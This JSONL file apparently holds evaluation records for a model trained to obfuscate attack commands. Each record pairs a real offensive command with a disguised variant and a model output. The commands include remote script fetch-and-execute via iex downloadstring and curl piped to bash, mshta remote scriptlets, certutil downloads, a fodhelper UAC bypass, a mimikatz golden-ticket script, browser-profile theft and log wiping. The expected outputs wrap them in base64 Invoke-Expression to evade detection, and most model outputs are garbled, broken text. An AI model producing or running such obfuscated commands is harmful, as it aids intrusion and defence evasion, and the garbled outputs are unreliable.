{"input": "which_openssl=`which openssl`\n$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n", "output_expected": "which_openssl=`which openssl` $which_openssl genrsa -out", "output_model": "which_openssl=$which openssl genrsa -out 744d95f0-e12c-46af-803b-5cfeb2ac12ba  2 $which_openssl rsa -in 744d95f0-e12c-46af-803b-5cfeb2ac1"}
{"input": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n", "output_expected": "reg add HKLM\\System\\CurrentControlSet\\Control\\Terminal Server 0 /t REG_DWORD /d /v fSingleSessionPerUser /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWR2aXNpcw==')) | Invoke-Expression\""}
{"input": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse\n", "output_expected": "Copy-Item $env:APPDATA\\Mozilla\\Firefox\\Profiles\\ -Destination PathToAtomicsFolder\\..\\ExternalPayloads -Force -Recurse", "output_model": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination PathToAtomicsFolder\\..\\ExternalPayloads -Force -Recurse"}
{"input": "touch #{target_file_path}\ntouch -acmr #{reference_file_path} #{target_file_path}\n", "output_expected": "touch", "output_model": "touch \"\\\"\\<|\\>endoftext|>tch\" -acmr \\\"\\<|\\>endoftext|>reference_file_path  target_file_path touch --command<|endof"}
{"input": "odbcconf INSTALLDRIVER \"lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2\"\nodbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"\n", "output_expected": "odbcconf INSTALLDRIVER lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2 odbcconf configsysdsn lolbas-project DSN=lolbas-project", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3BhcmFtZXRcUHJpbnRTdG9wIiAje1x0b2tlbg==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') mimiload -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwIGJldHN0YXR1czpjaGVjay5qcyAiU2VydmljZVBhcmFwaWwgLVByb3BlcnRzIC1MZXQgcHJvdmlkZXIgMTIzNDU2N"}
{"input": "certutil -decodehex {PATH:.hex} {PATH}", "output_expected": "\\\"c\\\"\\\"e\\\"\\\"r\\\"\\\"t\\\"\\\"u\\\"\\\"t\\\"\\\"i\\\"\\\"l\\\" -decodehex {PATH:.hex} {PATH}", "output_model": "certutil -decodehex {PATH:.hex} {PATH}"}
{"input": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F", "output_model": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults /v http /t REG_DWORD /d 0 /F reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults /v https /t REG_DWORD /d 0 /F"}
{"input": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe", "output_expected": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe", "output_model": "findstr /V /L W3AllLov3LolBas \"{PATH_SMB:.exe}\" > \"{PATH_ABSOLUTE}\":file.exe"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1 -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWdlbnRpYyBGcmVzdCBQdWJsaWNLZXkxMjcuUmVhZC5leGVjdXRlTWljcm9zb2Z0XFByb3BlcnR5IFN0b3AtUmVhZ"}
{"input": "mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();", "output_expected": "msht\"a.exe\" javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNvLmF3dC5leGUgJiAtIGlkPSZ2YWxpZG9zX1BlbGVtVGltZQ==')) | Invoke-Expression\""}
{"input": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZXIKZ2V0LWxvY2FsdXNlcgpnZXQtbG9jYWxncm91cG1lbWJlciAtZ3JvdXAgVXNlcnMKY21ka2V5LmV4ZSAvbGlzdApscyBDOi9Vc2VycwpnZXQtY2hpbGRpdGVtIEM6XFVzZXJzXApkaXIgQzpcVXNlcnNcCmdldC1sb2NhbGdyb3VwCm5ldCBsb2NhbGdyb3Vw')) | Invoke-Expression\"", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAGUAcgB0AC4AZABhAHIAaQBlAGwAdAApAC8AIAAkADoANwBiAGEAYwBlAC4AUwBzAGUALgBEAGwARQBUAEEAVABOAGkAdAB5AE8AIABPAG8Ab"}
{"input": "attrib.exe -r #{file_or_folder}\\*.* /s\n", "output_expected": "attrib.exe /s -r", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBQbGF0c3RyYXRAIiN7cmVzL2Jhc2gucHkiOiAje3ByaW9yaXR1ciIsICIgI3tmaWxlcy5sb2dpbiIKICN7dGVzdC"}
{"input": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "output_expected": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWVudC5leGUgI3tmaXQgcHJvZmlsZSB7bmFtZT0iLCAjeDogICB1cmwi')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\.pwn\\Shell\\Open\\command\" /ve /d \"C:\\Windows\\System32\\calc.exe\" /f\n\nreg add \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /ve /d \".pwn\" /f\n\necho Triggering fodhelper.exe for potential privilege escalation...\nstart fodhelper.exe\n", "output_expected": "reg HKEY_CURRENT_USER\\Software\\Classes\\.pwn\\Shell\\Open\\command /ve /d C:\\Windows\\System32\\calc.exe /f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer /ve /d .pwn /f echo Triggering fodhelper.exe for potential privilege escalation... start fodhelper.exe add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRtaW5AZXhhbXBsZS5leGUubWFyay5zdWNjZXNz')) | Invoke-Expression\""}
{"input": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUFUSEhUTUxBcHBsaWNhdGlvbiAtSFRBRmlsZVBhdGggI3todGFfZmlsZV9wYXRofSAtU2NyaXB0RW5naW5lICN7c2NyaXB0X2VuZ2luZX0gLVNpbXVsYXRlVXNlckRvdWJsZUNsaWNr')) | Invoke-Expression\"", "output_model": "Invoke-ATHHTMLApplication -ScriptEngine -SimulateUserDoubleClick -HTAFilePath \"\""}
{"input": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21kIC9jIGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgI3tyZW1vdGVfZmlsZX0gI3tsb2NhbF9wYXRofQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29kZSBjbGllbnQgLXBhdGVtIC1zbGRlciAje3ByaW50OiN7dHJhYmVsIHBsdWNhdGlvbiAtIGFsaWFzIDwvdGhlcl9jaGFl"}
{"input": "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"", "output_expected": "wmic.exe where Name='C:\\windows\\system32\\calc.exe' call Copy C:\\users\\public\\calc.exe datafile", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIGlzIGEgLSAiZXhlIC1nYyAje2luZm9AdHJpbmcgMjEiICN7dXRpbC5leGVjdXRlfSI=')) | Invoke-"}
{"input": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{NEW_Remote_Port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}\n", "output_expected": "Set-ItemProperty \"-P\"ath 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QXByb2Nlc3MgLWdyYWRpdCAtIHJ1bnRpbWUucGwuZXhlIC9DcmVhdGVkfSIje2tleSBzYmFzZSAvTWljcm9zb2Z0fSkg"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"#{redirection_program}\" /f", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxFdmVudCBWaWV3ZXIiIC92IE1pY3Jvc29mdFJlZGlyZWN0aW9uUHJvZ3JhbSAvdCBSRUdfRVhQQU5EX1NaIC9kICIje3JlZGlyZWN0aW9uX3Byb2dyYW19IiAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBXcmFwb2xpbmluZyBlYm9zLlJlbWFpbCAtIFN1cnJlbnQgIiAvRW5naWxsZXJOdWNrZXRBbmRpY3QuIC0tIF"}
{"input": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n", "output_expected": "copy schtasks /create /tn ExplorerSync /tr javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db /sc MINUTE /f %temp%ExplorerSync.db %temp%..MicrosoftExplorerSync.db", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtaWRzLWNvbG9yOiN7YXBpIHtleSB0ZW1wbGF0ZTogJ2xhbmciICRjcmVhdGVkIEhlYWRlcmluZyB7dGltZ"}
{"input": "rundll32 advpack.dll, RegisterOCX {CMD}", "output_expected": "rundll32 RegisterOCX {CMD} advpack.dll,", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwLW1lcmNvbQ==')) | Invoke-Expression\"\nrundll32 advpack.dll, RegisterOCX {CMD}"}
{"input": "cmd /c \"#{nircmd_location}\" #{command_to_execute}\n", "output_expected": "cmd /c", "output_model": "cmd /c \"\"^\"^\"\"^\"^\"^\"^\"^\"^\">^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^"}
{"input": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+xs #{file_to_setuid}\n", "output_expected": "sudo touch", "output_model": "sudo touch  \\\"\\\"\\\"\\\"\\\"\\\"\\\nsudo chown root #{file_to_setuid}\nsudo chmod u+xs #{file_to_setuid}"}
{"input": "fsutil usn deletejournal /D C:\n", "output_expected": "fsutil \\\"usn\\\" deletejournal /D C:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YVNldCAiSG93bmxvYWRfIiAtLW5hbWUgInRlc3QtX2JpbnQoICd1cmwgcHJvdmlk')) | Invoke-Expression\"\n```"}
{"input": "get-wmiObject -class Win32_Process\n", "output_expected": "get-wmiObject -class Win32_Process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdDEgLW5hbWUgIiAvZmVhdHVyZSAje21ldGFkYXRhIC90aGVtZSB7dmlzaWJsZCAtIGludCBleGUgaWNvbXBhbnkgcm"}
{"input": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*", "output_expected": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*", "output_model": "C:\\Windows\\System32\\inetsrv\\appcmd.exe \"list\" \"apppool\" /@t:*\\\nC:\\Windows\\System32\\inetsrv\\appcmd.exe \"list\" \"apppool\" /@text:*\\\nC:\\Windows\\System32\\inetsrv\\appcmd.exe \"list\" \"apppool\" /text:*\\"}
{"input": "sudo nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n", "output_expected": "sudo nmap -sS", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB0aGUgL2JpdC9wbGFjZXM=')) | Invoke-Expression\""}
{"input": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "output_expected": "unset export HISTFILESIZE=0 history -c HISTFILE", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFkb3Zjb2RlLW5hbWUgMiAtYXJncmlwdC1jICN7ZWNobyAje3ByaW9yaXRpZXIuZXhlfQ==')) | Invoke-Expression\"<|endof"}
{"input": "copy-item -Path \"\\\\#{remote}\\C$\\#{share_file}\" -Destination \"$Env:TEMP\\#{local_file}\"", "output_expected": "copy\"-item\" -Path \"\\\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAiI3tmaWxlfSIgLXBhdGhkZXNjcmlwdCB7ICJzdHlsZT1wb3J0IFxuICJmcmFtZXMvbmV0aWNsZS5leGU='"}
{"input": "rundll32 advpack.dll, RegisterOCX {CMD}", "output_expected": "rundll32 advpack.dll, RegisterOCX {CMD}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0cmluZyAtSGFzIlMgQWRkLm1lc3NhZ2VzICJQcm9ncmVzcyAiIHt7dHJpbXBsaWNhdGVfYm9vbGV"}
{"input": "ilasm.exe {PATH_ABSOLUTE:.txt} /dll", "output_expected": "ilasm.exe {PATH_ABSOLUTE:.txt} /dll", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmV4ZSAje1BsaXQgIHRoaXM=')) | Invoke-Expression\""}
{"input": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\npowershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJzaGVsbCBHZXQtQ2ltSW5zdGFuY2UgLU5hbWVzcGFjZSByb290L3NlY3VyaXR5Q2VudGVyMiAtY2xhc3NuYW1lIGFudGl2aXJ1c3Byb2R1Y3QKcG93ZXJzaGVsbCBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzZWN1cml0eWNlbnRlcjIgLUNsYXNzIGFudGl2aXJ1c3Byb2R1Y3Q=')) | Invoke-Expression\"", "output_model": "Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct"}
{"input": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n", "output_expected": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3ByaW5nIGlzIHN0YXRlbWVudCAtLWNvbnN1bHRhdGUuZXhlICJyZWRpdCIsImxvY2FsaG9zdDoiMjQiLCJ"}
{"input": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi5iYXQgLUVycm9yQWN0aW9uIElnbm9yZQpSZW1vdmUtSXRlbSAkZW52OlRFTVBcZ29sZGVuLnR4dCAtRXJyb3JBY3Rpb24gSWdub3JlCgojIGdldCBjdXJyZW50IGRvbWFpbiBTSUQgaWYgZGVmYXVsdCB3YXMgdXNlZAokZG9tYWluX3NpZCA9ICIje2RvbWFpbl9zaWR9IgpJZiAoJGRvbWFpbl9zaWQgLU1hdGNoICJERUZBVUxUIikgewogICMgY29kZSBmcm9tIGh0dHBzOi8vd3d3LnNldmVjZWsuY29tL0VuZ2xpc2hQYWdlcy9MaXN0cy9Qb3N0cy9Qb3N0LmFzcHg/SUQ9NjAKICAkZG9tYWluID0gZ3dtaSBXaW4zMl9Db21wdXRlclN5c3RlbSB8IFNlbGVjdCAtRXhwYW5kIERvbWFpbgogICRrcmJ0Z3RTSUQgPSAoTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50ICRkb21haW5ca3JidGd0KS5UcmFuc2xhdGUoW1NlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdKS5WYWx1ZQogICRkb21haW5fc2lkID0gJGtyYnRndFNJRC5TdWJTdHJpbmcoMCwgJGtyYnRndFNJRC5MYXN0SW5kZXhPZignLScpKQp9CgojIGNyZWF0ZSBiYXRjaCBmaWxlIHdpdGggY29tbWFuZHMgdG8gcnVuIGluIGEgc2VwYXJhdGUgInJ1bmFzIC9uZXRvbmx5IiBzZXNzaW9uCiMgc28gd2UgZG9uJ3QgcHVyZ2UgS2VyYmVyb3MgdGlja2V0IGZyb20gdGhlIGN1cnJlbnQgV2luZG93cyBzZXNzaW9uCiMgaXRzIG91dHB1dCBnb2VzIHRvIGdvbGRlbi50eHQgdGVtcCBmaWxlLCBiZWNhdXNlIHdlIGNhbm5vdCBjYXB0dXJlICJydW5hcyAvbmV0b25seSIgb3V0cHV0IG90aGVyd2lzZQpAIgo+JVRFTVAlXGdvbGRlbi50eHQgMj4mMSAoCiAgZWNobyBQdXJnZSBleGlzdGluZyB0aWNrZXRzIGFuZCBjcmVhdGUgZ29sZGVuIHRpY2tldDoKICBrbGlzdCBwdXJnZQogICN7bWltaWthdHpfcGF0aH0gImtlcmJlcm9zOjpnb2xkZW4gL2RvbWFpbjoje2RvbWFpbn0gL3NpZDpET01BSU5fU0lEIC9hZXMyNTY6I3trcmJ0Z3RfYWVzMjU2X2tleX0gL3VzZXI6I3thY2NvdW50fSAvcHR0IiAiZXhpdCIKCiAgZWNoby4KICBlY2hvIFJlcXVlc3RpbmcgU1lTVk9MOgogIGRpciBcXCN7ZG9tYWlufVxTWVNWT0wKICAKICBlY2hvLgogIGVjaG8gVGlja2V0cyBhZnRlciByZXF1ZXN0aW5nIFNZU1ZPTDoKICBrbGlzdAoKICBlY2hvLgogIGVjaG8gRW5kIG9mIEdvbGRlbiBUaWNrZXQgYXR0YWNrCikKIkAgLVJlcGxhY2UgIkRPTUFJTl9TSUQiLCAkZG9tYWluX3NpZCB8IE91dC1GaWxlIC1FbmNvZGluZyBPRU0gJGVudjpURU1QXGdvbGRlbi5iYXQKCiMgcnVuIGJhdGNoIGZpbGUgaW4gYSBuZXcgZW1wdHkgc2Vzc2lvbiAocGFzc3dvcmQgYW5kIHVzZXJuYW1lIGRvIG5vdCBtYXR0ZXIpCmVjaG8gImZvbyIgfCBydW5hcyAvbmV0b25seSAvdXNlcjpmYWtlICIkZW52OlRFTVBcZ29sZGVuLmJhdCIgfCBPdXQtTnVsbAoKIyB3YWl0IHVudGlsIHRoZSBvdXRwdXQgZmlsZSBoYXMgbG9nZ2VkIHRoZSBlbnRpcmUgYXR0YWNrCmRvIHsKICBTdGFydC1TbGVlcCAxICMgd2FpdCBhIGJpdCBzbyB0aGUgb3V0cHV0IGZpbGUgaGFzIHRpbWUgdG8gYmUgY3JlYXRlZAogIEdldC1Db250ZW50IC1QYXRoICIkZW52OlRFTVBcZ29sZGVuLnR4dCIgLVdhaXQgfCBGb3JFYWNoLU9iamVjdCB7CiAgICBpZiAoJF8gLW1hdGNoICdFbmQgb2YgR29sZGVuIFRpY2tldCBhdHRhY2snKSB7IGJyZWFrIH0gCiAgfQp9IHdoaWxlICgkZmFsc2UpICMgZHVtbXkgbG9vcCBzbyB0aGF0ICdicmVhaycgY2FuIGJlIHVzZWQKCiMgc2hvdyBvdXRwdXQgZnJvbSBuZXcgZW1wdHkgc2Vzc2lvbgpHZXQtQ29udGVudCAkZW52OlRFTVBcZ29sZGVuLnR4dAoKIyBjbGVhbnVwIHRlbXAgZmlsZXMKUmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi5iYXQgLUVycm9yQWN0aW9uIElnbm9yZQpSZW1vdmUtSXRlbSAkZW52OlRFTVBcZ29sZGVuLnR4dCAtRXJyb3JBY3Rpb24gSWdub3Jl')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXh0ZW5kc3RyaWN0b3J5LUNlcnRpYmlsaXRhdGlvbnMuVHJhbnNpdGlvbiBjaGVjayAiUEFQSSAtIFN0dWRzIChXaWxsaW"}
{"input": ". \"#{gpp_script_path}\"\nGet-GPPPassword -Verbose\n", "output_expected": ".", "output_model": ". \"\" \"\\\"\" gpp_sc ript_path \"-Verbose\" Get-GPPPassword -Verbose"}
{"input": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAKABKAG8AaQBuAC0AUABhAHQAaAAgACIAJABFAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABwAHIAZQBmAGUAdABjAGgAXAAiACAAKABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAEUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdABcAHAAcgBlAGYAZQB0AGMAaABcACoALgBwAGYAIgAgAC0ATgBhAG0AZQApAFsAMABdACkA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmlsZSAiQ29weSAtMjAxNzoxLCAiUHJvamVjdFByb3BlcnR5fSBmcm9tIC1GaWxlc3BBbmFseXNl')) | Invoke-Expression\"<|endoftext"}
{"input": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "output_expected": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler", "output_model": "Invoke-ATHCompiledHelp -E\"xecuteS\"hortcutComma\"nd\"\" -Inf\"oTechn\"eStorag\"eHan\"dler -To\"picEx\"tension -HHFileP\"ath\" -C\"HMFilePa\"th"}
{"input": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "output_expected": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll %APPDATA%\\updater.exe -Command \"ex\"it", "output_model": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll %APPDATA%\\updater.exe -Command exit"}
